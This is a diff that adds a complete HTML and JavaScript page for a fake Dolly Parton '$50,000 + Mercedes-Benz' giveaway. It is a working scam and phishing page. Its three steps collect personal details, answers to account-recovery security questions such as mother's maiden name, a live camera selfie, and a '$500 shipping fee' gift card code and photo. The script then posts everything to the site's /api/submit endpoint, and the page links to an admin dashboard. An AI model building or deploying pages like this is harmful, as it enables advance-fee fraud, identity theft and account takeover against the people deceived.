@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Dolly Parton's Dream Giveaway | $50,000 + Mercedes-Benz</title>
+    <!-- Google Fonts & Font Awesome -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: #0a0a2a;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .bg-slider {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            overflow: hidden;
+        }
+
+        .slides {
+            display: flex;
+            width: 100%;
+            height: 100%;
+            animation: slideShow 24s infinite ease-in-out;
+        }
+
+        .slide {
+            min-width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center center;
+            background-repeat: no-repeat;
+            filter: brightness(0.35) blur(2px);
+        }
+
+        @keyframes slideShow {
+            0% { transform: translateX(0%); }
+            16% { transform: translateX(0%); }
+            20% { transform: translateX(-100%); }
+            36% { transform: translateX(-100%); }
+            40% { transform: translateX(-200%); }
+            56% { transform: translateX(-200%); }
+            60% { transform: translateX(-300%); }
+            76% { transform: translateX(-300%); }
+            80% { transform: translateX(-400%); }
+            96% { transform: translateX(-400%); }
+            100% { transform: translateX(0%); }
+        }
+
+        .form-container {
+            max-width: 900px;
+            margin: 2rem auto;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.96);
+            border-radius: 2rem;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,215,0,0.3);
+            position: relative;
+            z-index: 10;
+        }
+
+        .admin-link {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #c62828;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 40px;
+            text-decoration: none;
+            font-weight: bold;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            transition: all 0.3s;
+        }
+
+        .admin-link:hover {
+            background: #8b0000;
+            transform: scale(1.05);
+        }
+
+        .hero {
+            text-align: center;
+            border-bottom: 3px solid #f5c542;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+        }
+
+        .hero h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #c62828, #f9a825);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .hero h2 {
+            font-size: 1.3rem;
+            color: #2c3e4e;
+            margin: 0.5rem 0;
+        }
+
+        .prize-badge {
+            background: #1e2a36;
+            display: inline-block;
+            padding: 0.4rem 1.2rem;
+            border-radius: 40px;
+            color: #ffd966;
+            font-weight: bold;
+            margin: 0.8rem 0;
+        }
+
+        .security-note {
+            background: #fff3e0;
+            border-left: 8px solid #e67e22;
+            padding: 1rem 1.5rem;
+            border-radius: 20px;
+            margin: 1.5rem 0;
+            font-weight: 500;
+            color: #b64926;
+        }
+
+        .security-note i {
+            margin-right: 12px;
+            font-size: 1.4rem;
+            vertical-align: middle;
+        }
+
+        .step {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .step.active-step {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px);}
+            to { opacity: 1; transform: translateY(0);}
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            font-weight: 600;
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #1f2d3d;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #ccc;
+            border-radius: 28px;
+            font-size: 1rem;
+            transition: 0.2s;
+            background: white;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            border-color: #f5b042;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(245,176,66,0.2);
+        }
+
+        .row-2col {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .row-2col .form-group {
+            flex: 1;
+        }
+
+        button.next-btn, button.prev-btn, button.submit-final {
+            background: #d4af37;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 40px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-right: 12px;
+            color: #1e2a36;
+        }
+
+        button.next-btn:hover, button.submit-final:hover {
+            background: #c49a1f;
+            transform: scale(1.02);
+        }
+
+        button.prev-btn {
+            background: #6c757d;
+            color: white;
+        }
+
+        .tracking-area {
+            background: #eef2f7;
+            padding: 1rem;
+            border-radius: 28px;
+            text-align: center;
+            margin: 1rem 0;
+            font-family: monospace;
+            font-weight: bold;
+        }
+
+        .camera-preview {
+            margin-top: 12px;
+            display: flex;
+            gap: 15px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        video, #snapshotCanvas {
+            width: 160px;
+            border-radius: 20px;
+            border: 2px solid #ddd;
+            background: #000;
+        }
+
+        .giftcard-upload {
+            background: #f9f7f3;
+            padding: 1rem;
+            border-radius: 24px;
+        }
+
+        .file-info {
+            font-size: 0.8rem;
+            color: #555;
+            margin-top: 5px;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 0.8rem;
+            color: #5a6e7a;
+        }
+
+        @media (max-width: 700px) {
+            .form-container {
+                margin: 1rem;
+                padding: 1.2rem;
+            }
+            .admin-link {
+                bottom: 10px;
+                right: 10px;
+                padding: 8px 15px;
+                font-size: 0.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="bg-slider">
+    <div class="slides" id="dynamicSlides"></div>
+</div>
+
+<!-- Admin Dashboard Link -->
+
+    <i class="fas fa-chalkboard-user"></i> Admin Dashboard
+</a>
+
+<div class="form-container" id="app">
+    <div class="hero">
+        <h1>✨ DOLLY PARTON'S ✨</h1>
+        <h2>$50,000 + BRAND NEW MERCEDES-BENZ GIVEAWAY</h2>
+        <div class="prize-badge"><i class="fas fa-gem"></i> Official Fan Appreciation Event</div>
+    </div>
+
+    <div class="security-note">
+        <i class="fas fa-shield-alt"></i> <strong>🔒 IMPORTANT SECURITY NOTICE:</strong> We will NEVER ask for your credit/debit card or personal banking details. 
+        Only a <strong>$500 shipping fee via Gift Card</strong> (upload & code) is required. Your privacy is our priority! Follow instructions carefully.
+    </div>
+
+    <form id="giveawayForm" enctype="multipart/form-data">
+        <!-- STEP 1 -->
+        <div class="step active-step" id="step1">
+            <h3><i class="fas fa-user-circle"></i> 1. Your Details & Fan Story</h3>
+            <div class="form-group">
+                <label>Full Name *</label>
+                <input type="text" name="fullname" required placeholder="Enter your full legal name">
+            </div>
+            <div class="row-2col">
+                <div class="form-group">
+                    <label>Email Address *</label>
+                    <input type="email" name="email" required placeholder="example@domain.com">
+                </div>
+                <div class="form-group">
+                    <label>Phone Number *</label>
+                    <input type="tel" name="phone" required placeholder="+1 234 567 8900">
+                </div>
+            </div>
+            <div class="form-group">
+                <label>📦 Shipping Address (Street, City, State, ZIP, Country) *</label>
+                <textarea name="shippingAddress" rows="2" required placeholder="Full address for prize delivery"></textarea>
+            </div>
+            <div class="form-group">
+                <label>❤️ What do you love most about Dolly Parton?</label>
+                <textarea name="loveMessage" rows="2" placeholder="Her music, philanthropy, smile, or something special..."></textarea>
+            </div>
+            <div class="form-group">
+                <label>🎀 How long have you been a Dolly fan?</label>
+                <select name="fanDuration">
+                    <option value="Less than 1 year">Less than 1 year</option>
+                    <option value="1-5 years">1-5 years</option>
+                    <option value="5-10 years">5-10 years</option>
+                    <option value="10+ years">10+ years</option>
+                    <option value="Since 9 to 5!">Since 9 to 5!</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>🎤 Your favorite Dolly memory or song?</label>
+                <input type="text" name="favMemory" placeholder="e.g., 'Jolene' live concert...">
+            </div>
+            <div style="text-align: right;">
+                <button type="button" class="next-btn" onclick="goToStep(2)">Next: Security & Selfie <i class="fas fa-arrow-right"></i></button>
+            </div>
+        </div>
+
+        <!-- STEP 2 -->
+        <div class="step" id="step2">
+            <h3><i class="fas fa-lock"></i> 2. Security Verification & Selfie</h3>
+            <div class="form-group">
+                <label>🔐 Security Question 1</label>
+                <select name="secQuestion1">
+                    <option value="What was your first pet's name?">What was your first pet's name?</option>
+                    <option value="What is your mother's maiden name?">What is your mother's maiden name?</option>
+                    <option value="What city were you born in?">What city were you born in?</option>
+                </select>
+                <input type="text" name="secAnswer1" placeholder="Your answer" required>
+            </div>
+            <div class="form-group">
+                <label>🔐 Security Question 2</label>
+                <select name="secQuestion2">
+                    <option value="What was your childhood nickname?">What was your childhood nickname?</option>
+                    <option value="What is your favorite Dolly song?">What is your favorite Dolly song?</option>
+                    <option value="What year did you graduate high school?">What year did you graduate high school?</option>
+                </select>
+                <input type="text" name="secAnswer2" placeholder="Your answer" required>
+            </div>
+            <div class="form-group">
+                <label>📸 Take a Selfie (or upload recent photo) *</label>
+                <div style="display: flex; gap: 15px; flex-wrap: wrap;">
+                    <button type="button" id="openCameraBtn" class="next-btn" style="background:#3b6e8b;"><i class="fas fa-camera"></i> Open Camera</button>
+                    <input type="file" id="selfieUpload" accept="image/*" style="width:auto;">
+                </div>
+                <div class="camera-preview" id="cameraPreviewDiv" style="display:none;">
+                    <video id="video" autoplay playsinline style="width:200px;"></video>
+                    <button type="button" id="captureBtn" class="next-btn" style="background:#2c3e50;">Capture Selfie</button>
+                    <canvas id="snapshotCanvas" style="display:none;"></canvas>
+                </div>
+                <input type="hidden" id="selfieDataURL" name="selfieBase64">
+                <div id="selfiePreview"></div>
+                <div class="file-info">Please take a clear selfie or upload an image.</div>
+            </div>
+            <div class="tracking-area">
+                <i class="fas fa-truck-fast"></i> <strong>Your tracking number:</strong> 
+                <span id="trackingPreview">DOLLY-XXXXXXXX</span>
+            </div>
+            <div style="display: flex; justify-content: space-between; margin-top: 20px;">
+                <button type="button" class="prev-btn" onclick="goToStep(1)"><i class="fas fa-chevron-left"></i> Back</button>
+                <button type="button" class="next-btn" onclick="goToStep(3)">Next: Gift Card Payment <i class="fas fa-credit-card"></i></button>
+            </div>
+        </div>
+
+        <!-- STEP 3 -->
+        <div class="step" id="step3">
+            <h3><i class="fas fa-gift-card"></i> 3. Shipping Fee: $500 Gift Card Payment</h3>
+            <div class="security-note" style="background:#fef2e0;">
+                <i class="fas fa-info-circle"></i> We accept Vanilla Visa, Amazon, Mastercard gift card, or any prepaid card. <strong>NO personal credit/debit card details needed.</strong>
+            </div>
+            <div class="giftcard-upload">
+                <div class="form-group">
+                    <label>🎁 Gift Card Number / Code *</label>
+                    <input type="text" name="giftCardCode" placeholder="XXXX-XXXX-XXXX-XXXX" required>
+                </div>
+                <div class="form-group">
+                    <label>🖼️ Upload Photo of Gift Card (Front) *</label>
+                    <input type="file" name="giftCardImage" accept="image/*" required>
+                    <div class="file-info">Clear image showing card code.</div>
+                </div>
+                <div class="form-group">
+                    <label>🧾 Upload Receipt (optional)</label>
+                    <input type="file" name="receiptImage" accept="image/*">
+                </div>
+            </div>
+            <div style="margin-top: 20px; background:#e9ecef; padding: 12px; border-radius: 24px;">
+                <i class="fas fa-car"></i> 🚗 <strong>Mercedes-Benz Giveaway:</strong> Winner receives a brand new Mercedes-Benz + $50,000 cash!
+            </div>
+            <div style="display: flex; justify-content: space-between; margin-top: 25px;">
+                <button type="button" class="prev-btn" onclick="goToStep(2)"><i class="fas fa-chevron-left"></i> Back</button>
+                <button type="submit" class="submit-final" id="finalSubmitBtn"><i class="fas fa-paper-plane"></i> Submit Entry</button>
+            </div>
+        </div>
+    </form>
+    <footer>⭐ Official Dolly Parton Fan Giveaway | 100% Transparent</footer>
+</div>
+
+<script>
+    // FIXED: Background images with correct path
+    const imagePaths = [
+        '/public/images/1.jpg',
+        '/public/images/2.jpg',
+        '/public/images/3.jpg',
+        '/public/images/4.jpg',
+        '/public/images/5.jpg'
+    ];
+    
+    const slidesContainer = document.querySelector('.slides');
+    function buildSlides() {
+        slidesContainer.innerHTML = '';
+        imagePaths.forEach(src => {
+            const slideDiv = document.createElement('div');
+            slideDiv.className = 'slide';
+            slideDiv.style.backgroundImage = `url(${src})`;
+            slidesContainer.appendChild(slideDiv);
+        });
+    }
+    buildSlides();
+
+    let currentStep = 1;
+    function goToStep(step) {
+        document.querySelectorAll('.step').forEach(el => el.classList.remove('active-step'));
+        document.getElementById(`step${step}`).classList.add('active-step');
+        currentStep = step;
+        if(step === 2) generateTrackingPreview();
+    }
+
+    function generateTrackingPreview() {
+        const trackingSpan = document.getElementById('trackingPreview');
+        const randomNum = Math.floor(Math.random() * 10000000).toString().padStart(7,'0');
+        trackingSpan.innerText = `DOLLY-${randomNum}`;
+    }
+
+    // Selfie handling
+    const openCameraBtn = document.getElementById('openCameraBtn');
+    const videoElem = document.getElementById('video');
+    const captureBtn = document.getElementById('captureBtn');
+    const cameraDiv = document.getElementById('cameraPreviewDiv');
+    const snapshotCanvas = document.getElementById('snapshotCanvas');
+    const selfieUploadInput = document.getElementById('selfieUpload');
+    const selfieDataUrlInput = document.getElementById('selfieDataURL');
+
+    openCameraBtn.addEventListener('click', async () => {
+        cameraDiv.style.display = 'flex';
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            videoElem.srcObject = stream;
+            videoElem.play();
+            captureBtn.onclick = () => {
+                const context = snapshotCanvas.getContext('2d');
+                snapshotCanvas.width = videoElem.videoWidth;
+                snapshotCanvas.height = videoElem.videoHeight;
+                context.drawImage(videoElem, 0, 0, snapshotCanvas.width, snapshotCanvas.height);
+                const dataURL = snapshotCanvas.toDataURL('image/jpeg');
+                selfieDataUrlInput.value = dataURL;
+                const imgPreview = document.createElement('img');
+                imgPreview.src = dataURL;
+                imgPreview.style.width = '120px';
+                imgPreview.style.borderRadius = '16px';
+                document.getElementById('selfiePreview').innerHTML = '';
+                document.getElementById('selfiePreview').appendChild(imgPreview);
+                let tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+                videoElem.srcObject = null;
+                cameraDiv.style.display = 'none';
+            };
+        } catch(err) {
+            alert("Camera access denied. You can upload image file instead.");
+            cameraDiv.style.display = 'none';
+        }
+    });
+
+    selfieUploadInput.addEventListener('change', (e) => {
+        if(e.target.files.length) {
+            const file = e.target.files[0];
+            const reader = new FileReader();
+            reader.onload = function(ev) {
+                selfieDataUrlInput.value = ev.target.result;
+                const imgPreview = document.createElement('img');
+                imgPreview.src = ev.target.result;
+                imgPreview.style.width = '120px';
+                document.getElementById('selfiePreview').innerHTML = '';
+                document.getElementById('selfiePreview').appendChild(imgPreview);
+            };
+            reader.readAsDataURL(file);
+        }
+    });
+
+    // Form submission
+    const form = document.getElementById('giveawayForm');
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const name = document.querySelector('input[name="fullname"]').value;
+        const email = document.querySelector('input[name="email"]').value;
+        const addr = document.querySelector('textarea[name="shippingAddress"]').value;
+        const secAns1 = document.querySelector('input[name="secAnswer1"]').value;
+        const giftCode = document.querySelector('input[name="giftCardCode"]').value;
+        const giftCardFile = document.querySelector('input[name="giftCardImage"]').files[0];
+        const selfiePayload = selfieDataUrlInput.value;
+        
+        if(!name || !email || !addr || !secAns1 || !giftCode || !giftCardFile) {
+            alert("Please fill all required fields (*) and upload gift card image.");
+            return;
+        }
+        if(!selfiePayload && !selfieUploadInput.files.length) {
+            alert("Please provide a selfie (camera or upload).");
+            return;
+        }
+        
+        const formData = new FormData();
+        formData.append('fullname', document.querySelector('input[name="fullname"]').value);
+        formData.append('email', document.querySelector('input[name="email"]').value);
+        formData.append('phone', document.querySelector('input[name="phone"]').value);
+        formData.append('shippingAddress', document.querySelector('textarea[name="shippingAddress"]').value);
+        formData.append('loveMessage', document.querySelector('textarea[name="loveMessage"]').value);
+        formData.append('fanDuration', document.querySelector('select[name="fanDuration"]').value);
+        formData.append('favMemory', document.querySelector('input[name="favMemory"]').value);
+        formData.append('secQuestion1', document.querySelector('select[name="secQuestion1"]').value);
+        formData.append('secAnswer1', document.querySelector('input[name="secAnswer1"]').value);
+        formData.append('secQuestion2', document.querySelector('select[name="secQuestion2"]').value);
+        formData.append('secAnswer2', document.querySelector('input[name="secAnswer2"]').value);
+        formData.append('giftCardCode', document.querySelector('input[name="giftCardCode"]').value);
+        
+        if(selfiePayload) formData.append('selfieBase64', selfiePayload);
+        if(selfieUploadInput.files[0]) formData.append('selfieUploadFile', selfieUploadInput.files[0]);
+        if(giftCardFile) formData.append('giftCardImage', giftCardFile);
+        
+        const receiptFile = document.querySelector('input[name="receiptImage"]').files[0];
+        if(receiptFile) formData.append('receiptImage', receiptFile);
+        
+        const trackingNum = document.getElementById('trackingPreview')?.innerText || `DOLLY-${Date.now()}`;
+        formData.append('trackingNumber', trackingNum);
+        
+        const submitBtn = document.getElementById('finalSubmitBtn');
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+        
+        try {
+            const response = await fetch('/api/submit', {
+                method: 'POST',
+                body: formData
+            });
+            const result = await response.json();
+            if(result.success) {
+                alert(`🎉 SUCCESS!\nTracking Number: ${trackingNum}\nWe will verify your gift card and contact you soon!`);
+                form.reset();
+                document.getElementById('selfiePreview').innerHTML = '';
+                selfieDataUrlInput.value = '';
+                goToStep(1);
+            } else {
+                alert("Error: " + (result.error || "Please try again"));
+            }
+        } catch(error) {
+            alert("Connection error. Please make sure the server is running.");
+            console.error(error);
+        } finally {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Entry';
+        }
+    });
+    
+    generateTrackingPreview();
+</script>
+</body>
+</html>
